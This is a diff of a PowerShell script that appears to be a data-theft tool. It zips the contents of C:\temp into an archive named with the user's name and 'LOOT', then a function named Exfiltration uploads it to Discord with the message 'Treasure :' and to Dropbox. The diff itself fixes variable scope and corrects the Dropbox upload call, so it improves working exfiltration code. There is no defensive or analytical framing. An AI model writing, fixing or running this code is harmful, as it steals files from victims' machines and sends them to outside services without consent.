@@ -69,25 +69,21 @@ function Upload-Discord {
 }
 
 
+# Specify the username
+$username = $env:username
+
+# Specify the date format for the archive name
+$dateSansHeure = Get-Date -Format "dd-MM-yyyy_HH'H'mm"
+
 # Specify the destination zip file path with username and date
 $zipFileName = "${username}_LOOT_${dateSansHeure}.zip"
 $zipFilePath = Join-Path -Path "C:\temp" -ChildPath $zipFileName
 
-# Function to create a zip archive using Compress-Archive and upload to Discord
+# Function to create a zip archive using Compress-Archive
 function ZipFiles {
 
     # Specify the source directory
     $sourceDirectory = "C:\temp"
-
-    # Specify the username
-    $username = $env:username
-
-    # Specify the date format for the archive name
-    $dateSansHeure = Get-Date -Format "dd-MM-yyyy_HH'H'mm"
-
-    # Specify the destination zip file path with username and date
-    $zipFileName = "${username}_LOOT_${dateSansHeure}.zip"
-	$zipFilePath = Join-Path -Path "C:\temp" -ChildPath $zipFileName
 
     # Compress the contents of the source directory to a zip file
     Compress-Archive -Path $sourceDirectory -DestinationPath $zipFilePath
@@ -131,7 +127,7 @@ function Exfiltration {
     Upload-Discord -file $zipFilePath -text "Treasure :"
 
     # Call Upload-Dropbox
-    $zipFileName | Upload-Dropbox
+    Upload-Dropbox -SourceFilePath $zipFilePath
     
 }
 
